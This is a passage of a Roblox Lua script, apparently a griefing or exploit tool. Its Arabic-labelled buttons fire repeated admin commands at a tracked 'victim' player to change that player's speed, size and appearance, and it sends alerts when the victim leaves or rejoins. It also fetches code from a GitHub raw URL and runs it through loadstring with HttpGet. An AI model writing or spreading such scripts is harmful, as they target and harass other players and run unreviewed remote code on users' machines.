    buttonInstances["ratDance"].MouseButton1Click:Connect(function() executeVictimCommand(".ratDance") end)
    buttonInstances["fakeDeath"].MouseButton1Click:Connect(function() executeVictimCommand(".fakeDeath") end)
    buttonInstances["buffify"].MouseButton1Click:Connect(function() executeVictimCommand(".buffify") end)
    buttonInstances["emote"].MouseButton1Click:Connect(function() executeVictimCommand(".emote") end)
    buttonInstances["phase"].MouseButton1Click:Connect(executePhaseCommand)
    buttonInstances["aura"].MouseButton1Click:Connect(function() executeVictimCommand(".aura") end)
    buttonInstances["autoCopy1"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoCopy1", function()
            if currentVictim then
                executeCommand(".wormify  " .. currentVictim .. " .giantDwarf " .. currentVictim .. " .dog " .. currentVictim .. " .neon " .. currentVictim .. " .colour " .. currentVictim .. " P .speed " .. currentVictim .. " 01. ")
            end
        end, 7)
    end)
    buttonInstances["autoCopy2"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoCopy2", function()
            if currentVictim then
                executeCommand(".speed " .. currentVictim .. " 01. .jp " .. currentVictim .. " .emote " .. currentVictim .. " .giantDwarf " .. currentVictim .. " .neon " .. currentVictim .. " .colour " .. currentVictim .. " P ")
            end
        end, 7)
    end)
    buttonInstances["autoCopy3"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoCopy3", function()
            if currentVictim then
                executeCommand(".speed " .. currentVictim .. " 01. .jp " .. currentVictim .. " .worm " .. currentVictim .. " .giantDwarf " .. currentVictim .. "  .neon " .. currentVictim .. "  .colour " .. currentVictim .. " B ")
            end
        end, 7)
    end)
    buttonInstances["autoCopy4"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoCopy4", function()
            if currentVictim then
                executeCommand(".speed " .. currentVictim .. " 01. .jp " .. currentVictim .. "  .spongify " .. currentVictim .. " .emote " .. currentVictim .. " .sit " .. currentVictim .. " .size " .. currentVictim .. " 3 ")
            end
        end, 7)
    end)
    buttonInstances["autoCopy5"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoCopy5", function()
            if currentVictim then
                executeCommand(".speed " .. currentVictim .. " 01. .jp " .. currentVictim .. "  .car " .. currentVictim .. " .giantDwarf " .. currentVictim .. "  .sit " .. currentVictim .. "  .colour " .. currentVictim .. " pink ")
            end
        end, 7)
    end)
    buttonInstances["autoCopy6"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoCopy6", function()
            if currentVictim then
                executeCommand(".speed " .. currentVictim .. " 01. .jp " .. currentVictim .. " .worm " .. currentVictim .. " .thin " .. currentVictim .. " .neon " .. currentVictim .. " .colour " .. currentVictim .. " pink ")
            end
        end, 7)
    end)

    showSection("الضحيه")
    ToggleButton.Active = true
    ToggleButton.Draggable = true

    function trackVictimStatus()
        local lastVictimPlayer = nil
        Players.PlayerRemoving:Connect(function(leavingPlayer)
            if currentVictim and leavingPlayer.Name == currentVictim then
                showNotification("🛑 الضحية " .. leavingPlayer.Name .. " خرج من السيرفر", {
                    Image = loadPlayerImage(leavingPlayer.UserId)
                }, true)
                lastVictimPlayer = leavingPlayer
            end
        end)
        Players.PlayerAdded:Connect(function(joiningPlayer)
            if currentVictim and joiningPlayer.Name == currentVictim then
                showNotification("✅ الضحية " .. joiningPlayer.Name .. " دخل إلى السيرفر", {
                    Image = loadPlayerImage(joiningPlayer.UserId)
                }, false)
            end
        end)
    end

    loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsclor/Wa7eed/refs/heads/main/CV"))()

    coroutine.wrap(trackVictimStatus)()
end

-- ========== حدث الضغط على زر البدء ==========
startButton.MouseButton1Click:Connect(function()
    -- بدء السكريبت الرئيسي
    startMainScript()
    
    -- بعد انتهاء أنيميشن البدء (حوالي 6 ثوان) نقوم بإيقاف الموسيقى مع Fade Out
    task.wait(6) -- مدة أنيميشن البدء
    fadeOutAndStopMusic(2) -- 2 ثواني Fade Out
end)